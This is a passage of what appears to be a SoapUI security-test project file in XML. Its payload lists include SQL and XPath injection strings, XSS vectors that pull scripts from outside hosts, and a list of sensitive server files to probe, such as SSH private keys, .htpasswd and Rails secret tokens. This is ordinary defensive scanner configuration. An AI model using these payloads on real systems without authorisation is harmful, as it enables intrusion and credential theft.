"81dc9bdb52d04dc20036dbd8313ed055</con:sqlInjectionStrings><con:sqlInjectionStrings>' or true--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 28 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#</con:sqlInjectionStrings><con:sqlInjectionStrings>/*…*/</con:sqlInjectionStrings><con:sqlInjectionStrings>")) or (("x"))=(("x</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 21# </con:sqlInjectionStrings><con:sqlInjectionStrings>admin" --</con:sqlInjectionStrings><con:sqlInjectionStrings>' UNION SELECT sum(columnname ) from tablename --</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#</con:sqlInjectionStrings><con:sqlInjectionStrings>')) or (('x'))=(('x</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 29 </con:sqlInjectionStrings><con:sqlInjectionStrings>'&amp;'</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 7-- </con:sqlInjectionStrings><con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 3409=3409 AND ('pytW' LIKE 'pytY</con:sqlInjectionStrings><con:sqlInjectionStrings>and (select substring(@@version,1,1))='X'</con:sqlInjectionStrings><con:sqlInjectionStrings>benchmark(50000000,MD5(1))--</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 3409=3409 AND ('pytW' LIKE 'pytW</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 7# </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT NULL#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11--</con:sqlInjectionStrings><con:sqlInjectionStrings>") or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#</con:sqlInjectionStrings><con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=1--</con:sqlInjectionStrings><con:sqlInjectionStrings>or benchmark(50000000,MD5(1))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 31337#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9#</con:sqlInjectionStrings><con:sqlInjectionStrings>';WAITFOR DELAY '0:0:30'--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--</con:sqlInjectionStrings><con:sqlInjectionStrings>HAVING 1=0</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#</con:sqlInjectionStrings><con:sqlInjectionStrings>HAVING 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14</con:sqlInjectionStrings><con:sqlInjectionStrings>WHERE 1=1 AND 1=0</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 24-- </con:sqlInjectionStrings><con:sqlInjectionStrings>WHERE 1=1 AND 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>||</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),3</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 24 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#</con:sqlInjectionStrings><con:sqlInjectionStrings>WHERE 1=1 AND 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#</con:sqlInjectionStrings><con:sqlInjectionStrings>pg_SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or ("1"="1</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 25 </con:sqlInjectionStrings><con:sqlInjectionStrings>'*'</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 12-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 7506=9091 AND (5913=5913</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#</con:sqlInjectionStrings><con:sqlInjectionStrings>'=0--+</con:sqlInjectionStrings><con:sqlInjectionStrings>WHERE 1=1 AND 1=0#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 9# </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 26 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or ('1'='1'--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or '1'='1</con:sqlInjectionStrings><con:sqlInjectionStrings>admin" #</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 9-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1#</con:sqlInjectionStrings><con:sqlInjectionStrings>1 or sleep(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 27 </con:sqlInjectionStrings><con:sqlInjectionStrings>benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>') or sleep(5)='</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5--</con:sqlInjectionStrings><con:sqlInjectionStrings>HAVING 1=1-- </con:sqlInjectionStrings><con:sqlInjectionStrings>or pg_SLEEP(5)</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or ('1'='1'/*</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6</con:sqlInjectionStrings></con:config><con:assertion type="Sensitive Information Exposure" id="7043fbe7-3050-4324-9845-6110f8ad2bc8" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="service-path" parameterName="service-path" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="XPathInjectionSecurityScan" name="XPath Injection" id="3d79aa49-cb7f-4d1e-b8da-5258f9de7868" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:XPathInjection" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:xpathList> or name(//users/LoginID[1]) = 'LoginID' or 'a'='b</con:xpathList><con:xpathList>' or '1'='1</con:xpathList><con:xpathList>1/0</con:xpathList><con:xpathList>'%20o/**/r%201/0%20--</con:xpathList><con:xpathList>' o/**/r 1/0 --</con:xpathList><con:xpathList>;</con:xpathList><con:xpathList>'%20and%201=2%20--</con:xpathList><con:xpathList>' and 1=2 --</con:xpathList><con:xpathList>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:xpathList><con:xpathList>test� UNION select 1, @@version, 1, 1;�</con:xpathList></con:config><con:assertion type="Sensitive Information Exposure" id="0f796075-984a-4e81-9434-008a4271fbca" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="service-path" parameterName="service-path" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityProScan type="HttpMethodFuzzingScan" name="HTTP Method Fuzzing" id="7985af7d-7575-46ca-b5ab-9f4338c81093" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:HttpMethodFuzzingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:deselectedMethods/></con:config><con:assertion type="Sensitive Information Exposure" id="c1421c0d-e76e-446a-996c-f4250fc7291d" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:assertion type="Valid HTTP Status Codes" id="98b0557e-92be-488c-bf37-53566d3be8af" name="Valid HTTP Status Codes"><con:settings><con:setting id="__LEVEL_">WARNING</con:setting></con:settings><con:configuration><codes>501,405,403</codes></con:configuration></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityProScan><con:testStepSecurityProScan type="SensitiveFileSecurityScan" name="Sensitive Files Exposure" id="846c4a79-9830-44bd-96ca-b32cc0a2e0c7" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:SensitiveFileSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/known_hosts"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/authorized_keys"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.bak"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.old"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa~"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.bak"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.old"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa~"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.bak"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.old"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/htaccess.txt"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess~"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.bak"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.old"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd~"/><con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bash_history"/><con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bashrc"/><con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.history"/><con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.profile"/><con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.mysql_history"/><con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/~root"/><con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/config"/><con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/HEAD"/><con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/index"/><con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/entries"/><con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/wc.db"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/pccsmysqladm/incs/dbconnect.inc"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/perl/"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/phpBB/phpinfo.php"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/weblogic"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-admin/wp-login.php"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-content/debug.log"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/WEB-INF/web.xml"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iisadmin/"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iissamples/"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.jsp"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.php"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.bak"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.old"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html~"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/manager"/><con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/database.yml"/><con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/initializers/secret_token.rb"/><con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/seeds.rb"/><con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/development.sqlite3"/></con:config><con:assertion type="Sensitive Files Exposure Assertion" id="0ff04b8b-1db6-4b86-a66a-e62ec1ea9363" name="Sensitive Files Exposure"/><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityProScan><con:testStepSecurityProScan type="WeakAuthenticationScan" name="Weak Authentication" id="56f8f602-d82f-431c-adde-9558a3fa3a3a" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:assertion type="WeakPassword" id="258e3b2c-ce8d-45b8-b0eb-c5799aa34cfb" name="Weak Password Detection"><con:configuration/></con:assertion><con:assertion type="BasicAuth" id="203919a5-f5fe-4f3f-97de-8b6dbafcfc4c" name="Basic Authentication Detection"/><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityProScan></con:testStepSecurityTest><con:testStepSecurityTest><con:testStepId>5d501661-1a0b-4f83-8a27-7419ec90745d</con:testStepId><con:testStepSecurityScan type="BoundaryScan" name="Boundary Scan" id="ba806d33-1406-4081-a78b-11816705bc4f" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:assertion type="Sensitive Information Exposure" id="9f86358d-c5f8-4316-9792-db20fbf67005" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="service-path" parameterName="service-path" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="3e76f931-b36a-459f-842a-ded9bbf2cd9e" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings><con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings><con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings><con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG 